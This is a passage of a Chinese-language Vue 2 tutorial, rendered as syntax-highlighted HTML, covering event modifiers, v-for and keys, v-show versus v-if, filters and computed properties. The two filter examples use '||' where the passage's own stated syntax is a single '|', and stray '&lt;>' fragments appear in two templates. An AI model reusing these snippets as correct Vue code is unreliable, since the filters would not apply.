<span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    counter<span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"修飾符號-modifiers-2\">修飾符號 Modifiers</h3>\n<ul>\n<li><code>.stop</code>: 呼叫 js 中的 <code>event.stopPropagation()</code>，停止事件繼續傳遞。</li>\n<li><code>.prevent</code>: 呼叫 js 中的 <code>event.preventDefault()</code>，防止執行瀏覽器事件的預設行為。</li>\n<li><code>.capture</code>: 將事件傳遞方向改為向下捕獲（event capturing）模式。</li>\n<li><code>.self</code>: 只在有事件監聽器的 HTML 元素本身觸發（不含子元素）時才會觸發方法。</li>\n<li><code>.native</code>: 監聽組件根元素的原生事件。</li>\n<li><code>.once</code>: 事件只能被呼叫一次。</li>\n<li><code>.passive</code>: 2.3.0 版本後加入，以 <code>{ passive : true }</code> 的模式添加事件監聽器。</li>\n<li><code>.left</code>: 只點擊滑鼠左鍵才會觸發事件。</li>\n<li><code>.right</code>: 只點擊滑鼠右鍵才會觸發事件。</li>\n<li><code>.middle</code>: 只點擊滑鼠中鍵才會觸發事件。</li>\n<li><code>.{keyCode | keyAlias}</code>: 只按下鍵盤任一鍵值才會觸發事件。</li>\n</ul>\n<p>沒有修飾符的執行結果是 bubbling 方向 （由內到外）\n<code>thirdFunction()</code> -&gt; <code>secondFunction()</code> -&gt; <code>firstFunction()</code>\n├ <code>.stop</code>：只 call <code>thirdFunction()</code>，不執行 <code>secondFunction()</code> 和 <code>firstFunction()</code>\n├ <code>.prevent</code>：讓 submit 不會跳轉頁面\n├ <code>.capture</code>：執行結果換為 capturing 方向（由外到內）\n│ <code>firstFunction()</code> -&gt; <code>secondFunction()</code> -&gt; <code>thirdFunction()</code>\n├ <code>.self</code>：在作用區範圍內才能呼叫 function\n└ <code>.once</code>：function 只能執行一次</p>\n<h2 id=\"列表渲染\">列表渲染</h2>\n<h3 id=\"v-for\"><code>v-for</code></h3>\n<ul>\n<li>迭代顯示陣列或物件中的元素</li>\n<li><code>alias in expression</code></li>\n<li>expression: <code>array</code>, <code>object</code>, <code>number</code>, <code>string</code></li>\n</ul>\n<p>array：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(member, index) in memberArray<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      index: {{ index }}, id: {{ member.id }}, name: {{ member.name }}\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    memberArray<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n      <span class=\"token punctuation\">{</span> id<span class=\"token operator\">:</span> <span class=\"token string\">\"11\"</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> <span class=\"token string\">\"Eva\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">{</span> id<span class=\"token operator\">:</span> <span class=\"token string\">\"12\"</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> <span class=\"token string\">\"Ray\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">{</span> id<span class=\"token operator\">:</span> <span class=\"token string\">\"13\"</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> <span class=\"token string\">\"Ben\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>object：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(member, key, index) in memberObject<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      {{ index }} . {{ key }} : {{ member }}\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    memberObject<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      name<span class=\"token operator\">:</span> <span class=\"token string\">\"Eva\"</span><span class=\"token punctuation\">,</span>\n      gender<span class=\"token operator\">:</span> <span class=\"token string\">\"female\"</span><span class=\"token punctuation\">,</span>\n      age<span class=\"token operator\">:</span> <span class=\"token string\">\"22\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>number：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>n in 5<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{{ n }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>string：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>string in <span class=\"token punctuation\">'</span>Vue<span class=\"token punctuation\">'</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{{ string }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"key\">Key</h4>\n<p>在未設定 key 值的情況下，改變陣列中的元素會造成部分元素更新，但不會重新渲染元素。\n<code>DOM diff</code> 比較出差異後，將 C 更新成 F、D 更新成 C、E 更新成 D、最後再放入 E，效率沒有比較好。\n因此為了辨識每一項元素，Vue 提供 key 可以為每一項元素設定 key 值，\n所以設定 key 值的目的就是在 Virtual DOM 更新的時候，提供較高的效能，\n並使用 v-bind 綁定 key 屬性:key，讓陣列或物件裡的元素保有唯一性，\n當元素更新時，可以確保重新渲染元素。</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">v-for</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item in items<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">:key</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item.id<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token comment\">&lt;!-- content --></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"陣列元素操作\">陣列元素操作</h3>\n<p>Vue 提供一組可以操作陣列的 method，用來變更陣列元素，觀察其變更。\n├ <code>push()</code>: 新增元素\n├ <code>pop()</code>: 刪除最後加入的元素\n├ <code>shift()</code>: 刪除第一個元素\n├ <code>unshift()</code>: 加入元素至第一個位置\n├ <code>splice()</code>: 加入或移除元素\n├ <code>sort()</code>: 由小至大排序元素\n├ <code>reverse()</code>: 反轉元素排序\n├ <code>filter()</code>: 過濾陣列元素，回傳符合條件內容的新陣列\n├ <code>concat()</code>: 連接陣列，回傳新陣列\n└ <code>slice()</code>: 切割陣列，回傳新陣列</p>\n<h2 id=\"條件渲染\">條件渲染</h2>\n<h3 id=\"條件渲染指令\">條件渲染指令</h3>\n<h4 id=\"v-show\"><code>v-show</code></h4>\n<ul>\n<li>根據 expression 值為 true 或 false，\n切換 CSS 屬性的 <code>display</code>，顯示或隱藏含有 <code>v-show</code> 的元素。</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">v-show</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>isShow<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{{ message }}&lt;><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    message<span class=\"token operator\">:</span> <span class=\"token string\">\"v-show example\"</span><span class=\"token punctuation\">,</span>\n    isShow<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">setInterval</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  app<span class=\"token punctuation\">.</span>isShow <span class=\"token operator\">=</span> <span class=\"token operator\">!</span>app<span class=\"token punctuation\">.</span>isShow<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"v-if-v-else-if-v-else\"><code>v-if</code>, <code>v-else-if</code>, <code>v-else</code></h4>\n<ul>\n<li>當 expression 的條件成立後，才綁定該區資料並渲染出來</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">v-if</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>isShow<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{{ message }}&lt;><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    message<span class=\"token operator\">:</span> <span class=\"token string\">\"v-show example\"</span><span class=\"token punctuation\">,</span>\n    isShow<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">setInterval</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  app<span class=\"token punctuation\">.</span>isShow <span class=\"token operator\">=</span> <span class=\"token operator\">!</span>app<span class=\"token punctuation\">.</span>isShow<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">v-if</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>type === <span class=\"token punctuation\">'</span>A<span class=\"token punctuation\">'</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>A<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">v-else-if</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>type === <span class=\"token punctuation\">'</span>B<span class=\"token punctuation\">'</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>B<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">v-else-if</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>type === <span class=\"token punctuation\">'</span>C<span class=\"token punctuation\">'</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>C<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">v-else</span><span class=\"token punctuation\">></span></span>Not A/B/C<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    type<span class=\"token operator\">:</span> <span class=\"token string\">\"B\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"v-show-vs-v-if\"><code>v-show</code> vs <code>v-if</code></h4>\n<h5 id=\"多層條件判斷\">多層條件判斷</h5>\n<ul>\n<li><code>v-show</code> 只能對單獨元素做 true 或 false 的判斷。</li>\n<li><code>v-if</code> 可以加上 <code>v-else-if</code> 與<code>v-else</code>，可以條判斷比較多條件的狀況。</li>\n</ul>\n<h5 id=\"渲染-html-元素時機\">渲染 HTML 元素時機</h5>\n<ul>\n<li><code>v-show</code> 無條件渲染元素，不管條件 true 或 false，元素一定會被建立，然後再進行條件判斷\n使用 css 的 <code>display</code> 屬性來做顯示或消失的效果。</li>\n<li><code>v-if</code> 當條件為 true 才會實際渲染元素，如果一開始條件為 false 則不會進行任何事情。(lazy)</li>\n</ul>\n<h5 id=\"使用template元素\">使用<code>&lt;template&gt;</code>元素</h5>\n<ul>\n<li><code>v-show</code> 無法使用。</li>\n<li><code>v-if</code> 可以使用。</li>\n</ul>\n<h5 id=\"在何時花費較多運算時間？\">在何時花費較多運算時間？</h5>\n<ul>\n<li><code>v-show</code> 初始渲染元素時：不管條件真假，一定會將元素建立出來。</li>\n<li><code>v-if</code> 切換條件時：即使元素已存在，條件成立時就會重新渲染元素一次，\n所以在切換條件時，會花費較多運算時間。</li>\n</ul>\n<h5 id=\"使用時機\">使用時機</h5>\n<ul>\n<li><code>v-show</code> 頻繁切換條件的時候，使用 <code>v-show</code> 比較好。</li>\n<li><code>v-if</code> 條件控制比較複雜的時候，或則控制條件不太會改變，使用 <code>v-if</code> 比較好。</li>\n</ul>\n<h4 id=\"v-if-with-v-for\"><code>v-if</code> with <code>v-for</code></h4>\n<p><code>v-for</code> 優先權高於 <code>v-if</code>，\n因此當這兩個指令同時出現在同一個元素時，\n<code>v-if</code> 會隨著 <code>v-for</code> 的循環次數跟著判斷條件幾次。</p>\n<h2 id=\"選項物件屬性\">選項物件屬性</h2>\n<h3 id=\"filter\"><code>filter</code></h3>\n<ul>\n<li>將文字資料格式化</li>\n<li>可以在 filters 中放入自己寫好的 function，如全部英文字母轉大寫、價錢數值的格式化等等</li>\n<li>可以用<code>|</code>串聯</li>\n<li>是 JavaScript 函數，所以可以傳入參數</li>\n<li>適合做簡單的文字格式處理，或是改變狀態</li>\n<li>有兩種撰寫方式</li>\n</ul>\n<ol>\n<li>mustache 模板插值(mustache interpolations)\n<code>{{ message | filterA }}</code></li>\n<li>v-bind 表達式(v-bind expressions)\n<code>&lt;div v-bind:id=&quot;message | filterA&quot;&gt;&lt;/div&gt;</code></li>\n</ol>\n<ul>\n<li>兩種註冊方式</li>\n</ul>\n<ol>\n<li>本地過濾器（local filter）</li>\n</ol>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span><span class=\"token punctuation\">></span></span>{{ text || toUpperCase }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    text<span class=\"token operator\">:</span> <span class=\"token string\">\"hello vue\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  filters<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> value<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ol start=\"2\">\n<li>全局過濾器（global filter）</li>\n</ol>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">v-model</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>mytext<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{{ mytext || capitalize }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"capitalize\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> value<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> value<span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    mytext<span class=\"token operator\">:</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"computed\"><code>computed</code></h3>\n<ul>\n<li>對資料做處理計算，並且因為有 cache，可以避免重複處理資料，效能會比較好</li>\n<li>和 <code>filter</code> 相同，在<code>computed</code> 裡撰寫 function</li>\n<li>透過 this 從 data 取得資料並做運算</li>\n<li>可用於做較複雜的邏輯運算處理</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>原始訊息：{{ message }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>反轉訊息：{{ 